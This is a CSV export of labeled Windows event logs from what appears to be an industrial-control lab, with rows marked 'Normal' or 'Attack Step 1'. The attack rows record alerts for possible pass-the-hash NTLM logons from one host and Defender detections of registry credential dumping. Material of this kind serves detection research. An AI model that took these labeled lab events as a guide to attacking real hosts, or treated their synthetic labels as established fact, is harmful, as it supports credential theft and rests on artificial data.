4034,Normal,"May 9, 2025 @ 15:05:02.446",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,NT AUTHORITY\\SYSTEM,"\""C:\\Program Files\\Siemens\\Automation\\TIAADMIN\\server\\node.exe\"" \""--no-warnings\"" \""C:\\Program Files\\Siemens\\Automation\\TIAADMIN\\server\\server.js\"" \""--runservice\""","C:\\WINDOWS\\system32\\cmd.exe /d /s /c \""%%windir%%\\System32\\REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4035,Normal,"May 9, 2025 @ 15:05:04.843",16,10.12.25.5,Windows11EWS,System,7031,916,,,,,,,,,,,5,61107,TIA Administrator terminated unexpectedly,,,
4036,Normal,"May 9, 2025 @ 15:05:04.865",16,10.12.25.5,Windows11EWS,System,7040,916,,,,,,,,,,,3,61104,Service startup type was changed,,,
4037,Attack Step 1,"May 9, 2025 @ 15:07:36.304",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4038,Attack Step 1,"May 9, 2025 @ 15:07:36.321",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4039,Attack Step 1,"May 9, 2025 @ 15:07:36.343",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4040,Attack Step 1,"May 9, 2025 @ 15:07:37.652",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4041,Attack Step 1,"May 9, 2025 @ 15:07:37.659",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4042,Attack Step 1,"May 9, 2025 @ 15:07:37.666",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4043,Attack Step 1,"May 9, 2025 @ 15:07:57.319",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4044,Attack Step 1,"May 9, 2025 @ 15:07:57.342",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4045,Attack Step 1,"May 9, 2025 @ 15:09:21.689",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4046,Attack Step 1,"May 9, 2025 @ 15:09:21.700",16,10.12.25.5,Windows11EWS,Security,4776,960,,,,,,,,,,,5,60104,Windows audit failure event,,,
4047,Attack Step 1,"May 9, 2025 @ 15:09:21.746",16,10.12.25.5,Windows11EWS,Security,4625,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,5,60122,Logon Failure - Unknown user or bad password,[T1531],[Impact],[Account Access Removal]
4048,Attack Step 1,"May 9, 2025 @ 15:10:53.318",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4049,Attack Step 1,"May 9, 2025 @ 15:10:53.347",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4050,Attack Step 1,"May 9, 2025 @ 15:10:53.357",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4051,Attack Step 1,"May 9, 2025 @ 15:10:53.378",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4052,Attack Step 1,"May 9, 2025 @ 15:10:53.389",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4053,Attack Step 1,"May 9, 2025 @ 15:11:08.380",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4054,Attack Step 1,"May 9, 2025 @ 15:11:08.380",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4055,Attack Step 1,"May 9, 2025 @ 15:11:08.385",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4056,Attack Step 1,"May 9, 2025 @ 15:11:08.429",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4057,Attack Step 1,"May 9, 2025 @ 15:11:10.469",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4058,Attack Step 1,"May 9, 2025 @ 15:11:11.388",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource core",,3,67027,A process was created.,,,
4059,Attack Step 1,"May 9, 2025 @ 15:11:33.758",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4060,Attack Step 1,"May 9, 2025 @ 15:11:33.782",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4061,Attack Step 1,"May 9, 2025 @ 15:11:33.791",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4062,Attack Step 1,"May 9, 2025 @ 15:11:33.807",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4063,Attack Step 1,"May 9, 2025 @ 15:11:33.820",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4064,Attack Step 1,"May 9, 2025 @ 15:11:40.139",15,10.12.25.3,Windows11,Application,16384,2312,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4065,Attack Step 1,"May 9, 2025 @ 15:11:44.493",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource core",,3,67027,A process was created.,,,
4066,Attack Step 1,"May 9, 2025 @ 15:12:11.313",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4067,Attack Step 1,"May 9, 2025 @ 15:12:11.326",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4068,Attack Step 1,"May 9, 2025 @ 15:12:11.334",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4069,Attack Step 1,"May 9, 2025 @ 15:12:51.340",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4070,Attack Step 1,"May 9, 2025 @ 15:12:51.388",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4071,Attack Step 1,"May 9, 2025 @ 15:12:51.455",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4072,Attack Step 1,"May 9, 2025 @ 15:12:51.550",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4073,Attack Step 1,"May 9, 2025 @ 15:13:14.144",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4074,Attack Step 1,"May 9, 2025 @ 15:13:14.144",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4075,Attack Step 1,"May 9, 2025 @ 15:13:36.278",16,10.12.25.5,Windows11EWS,Security,4776,960,,,,,,,,,,,5,60104,Windows audit failure event,,,
4076,Attack Step 1,"May 9, 2025 @ 15:13:36.327",16,10.12.25.5,Windows11EWS,Security,4625,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,5,60122,Logon Failure - Unknown user or bad password,[T1531],[Impact],[Account Access Removal]
4077,Attack Step 1,"May 9, 2025 @ 15:13:51.730",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4078,Attack Step 1,"May 9, 2025 @ 15:13:51.731",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4079,Attack Step 1,"May 9, 2025 @ 15:14:39.658",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4080,Attack Step 1,"May 9, 2025 @ 15:14:39.660",15,10.12.25.3,Windows11,System,7040,844,,,,,,,,,,,3,61104,Service startup type was changed,,,
4081,Attack Step 1,"May 9, 2025 @ 15:14:39.667",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4082,Attack Step 1,"May 9, 2025 @ 15:14:39.679",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4083,Attack Step 1,"May 9, 2025 @ 15:14:41.623",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4084,Attack Step 1,"May 9, 2025 @ 15:14:42.963",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,1116,3168,Behavior:Win32/RegDump.SA,,,,,,,,,,12,62123,Windows Defender: Antimalware platform detected  potentially unwanted software (),,,
4085,Attack Step 1,"May 9, 2025 @ 15:14:43.095",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.27777.1008-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,,3,67027,A process was created.,,,
4086,Attack Step 1,"May 9, 2025 @ 15:14:43.096",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\smartscreen.exe -Embedding,,3,67027,A process was created.,,,
4087,Attack Step 1,"May 9, 2025 @ 15:14:44.040",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4088,Attack Step 1,"May 9, 2025 @ 15:14:44.096",15,10.12.25.3,Windows11,System,7040,844,,,,,,,,,,,3,61104,Service startup type was changed,,,
4089,Attack Step 1,"May 9, 2025 @ 15:14:45.529",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4090,Attack Step 1,"May 9, 2025 @ 15:14:45.542",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe\"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",,3,67027,A process was created.,,,
4091,Attack Step 1,"May 9, 2025 @ 15:14:47.939",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4092,Attack Step 1,"May 9, 2025 @ 15:14:50.965",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\AUDIODG.EXE 0x000000000000044C 0x000000000000046C,,3,67027,A process was created.,,,
4093,Attack Step 1,"May 9, 2025 @ 15:15:18.153",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,,3,67027,A process was created.,,,
4094,Attack Step 1,"May 9, 2025 @ 15:15:18.206",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4095,Attack Step 1,"May 9, 2025 @ 15:15:18.465",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k CameraMonitor,,3,67027,A process was created.,,,
4096,Attack Step 1,"May 9, 2025 @ 15:15:18.468",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k Camera,,3,67027,A process was created.,,,
4097,Attack Step 1,"May 9, 2025 @ 15:15:21.203",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.27777.1008-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,,3,67027,A process was created.,,,
4098,Attack Step 1,"May 9, 2025 @ 15:15:22.912",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4099,Attack Step 1,"May 9, 2025 @ 15:15:22.974",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4100,Attack Step 1,"May 9, 2025 @ 15:15:22.975",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4101,Attack Step 1,"May 9, 2025 @ 15:15:24.278",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4102,Attack Step 1,"May 9, 2025 @ 15:15:24.301",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4103,Attack Step 1,"May 9, 2025 @ 15:15:28.275",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4104,Attack Step 1,"May 9, 2025 @ 15:15:28.278",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k CameraMonitor,,3,67027,A process was created.,,,
4105,Attack Step 1,"May 9, 2025 @ 15:15:28.280",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k Camera,,3,67027,A process was created.,,,
4106,Attack Step 1,"May 9, 2025 @ 15:15:47.064",15,10.12.25.3,Windows11,System,7040,844,,,,,,,,,,,3,61104,Service startup type was changed,,,
4107,Attack Step 1,"May 9, 2025 @ 15:15:49.235",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,1117,3168,Behavior:Win32/RegDump.SA,,,,,,,,,,3,62124,Windows Defender: Antimalware platform performed an action to protect you from potentially unwanted software (),,,
4108,Attack Step 1,"May 9, 2025 @ 15:15:53.832",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4109,Attack Step 1,"May 9, 2025 @ 15:15:59.094",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4110,Attack Step 1,"May 9, 2025 @ 15:15:59.094",16,10.12.25.5,Windows11EWS,System,7040,916,,,,,,,,,,,3,61104,Service startup type was changed,,,
4111,Attack Step 1,"May 9, 2025 @ 15:15:59.142",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4112,Attack Step 1,"May 9, 2025 @ 15:15:59.142",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4113,Attack Step 1,"May 9, 2025 @ 15:16:01.283",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Windows Defender/Operational,2010,3880,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4114,Attack Step 1,"May 9, 2025 @ 15:16:01.284",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Windows Defender/Operational,1116,3880,Behavior:Win32/RegDump.SA,,,,,,,,,,12,62123,Windows Defender: Antimalware platform detected  potentially unwanted software (),,,
4115,Attack Step 1,"May 9, 2025 @ 15:16:02.267",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4116,Attack Step 1,"May 9, 2025 @ 15:16:02.281",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\SecurityHealthService.exe,,3,67027,A process was created.,,,
4117,Attack Step 1,"May 9, 2025 @ 15:16:03.144",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Windows Defender/Operational,2010,3880,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4118,Attack Step 1,"May 9, 2025 @ 15:16:03.146",16,10.12.25.5,Windows11EWS,System,7040,916,,,,,,,,,,,3,61104,Service startup type was changed,,,
4119,Attack Step 1,"May 9, 2025 @ 15:16:19.537",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,,3,67027,A process was created.,,,
4120,Attack Step 1,"May 9, 2025 @ 15:16:19.543",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.27777.1008-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,,3,67027,A process was created.,,,
4121,Attack Step 1,"May 9, 2025 @ 15:17:06.525",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Windows Defender/Operational,1117,3880,Behavior:Win32/RegDump.SA,,,,,,,,,,3,62124,Windows Defender: Antimalware platform performed an action to protect you from potentially unwanted software (),,,
4122,Attack Step 1,"May 9, 2025 @ 15:17:06.592",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4123,Attack Step 1,"May 9, 2025 @ 15:17:06.593",15,10.12.25.3,Windows11,Security,4776,888,,,,,,,,,,,5,60104,Windows audit failure event,,,
4124,Attack Step 1,"May 9, 2025 @ 15:17:06.604",15,10.12.25.3,Windows11,Security,4625,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,5,60122,Logon Failure - Unknown user or bad password,[T1531],[Impact],[Account Access Removal]
4125,Attack Step 1,"May 9, 2025 @ 15:17:11.834",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4126,Attack Step 1,"May 9, 2025 @ 15:17:40.335",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4127,Attack Step 1,"May 9, 2025 @ 15:17:40.343",16,10.12.25.5,Windows11EWS,Security,4776,960,,,,,,,,,,,5,60104,Windows audit failure event,,,
4128,Attack Step 1,"May 9, 2025 @ 15:17:40.386",16,10.12.25.5,Windows11EWS,Security,4625,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,5,60122,Logon Failure - Unknown user or bad password,[T1531],[Impact],[Account Access Removal]
4129,Attack Step 1,"May 9, 2025 @ 15:17:47.858",15,10.12.25.3,Windows11,System,7040,844,,,,,,,,,,,3,61104,Service startup type was changed,,,
4130,Attack Step 1,"May 9, 2025 @ 15:18:48.081",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4131,Attack Step 1,"May 9, 2025 @ 15:18:48.082",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Engineer - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4132,Attack Step 1,"May 9, 2025 @ 15:19:03.773",16,10.12.25.5,Windows11EWS,System,7040,916,,,,,,,,,,,3,61104,Service startup type was changed,,,
4133,Attack Step 1,"May 9, 2025 @ 15:19:26.134",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4134,Attack Step 1,"May 9, 2025 @ 15:19:26.147",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4135,Attack Step 1,"May 9, 2025 @ 15:19:26.193",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4136,Attack Step 1,"May 9, 2025 @ 15:19:27.213",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4137,Attack Step 1,"May 9, 2025 @ 15:19:27.221",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4138,Attack Step 1,"May 9, 2025 @ 15:19:27.229",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4139,Attack Step 1,"May 9, 2025 @ 15:19:29.606",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4140,Attack Step 1,"May 9, 2025 @ 15:19:30.679",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
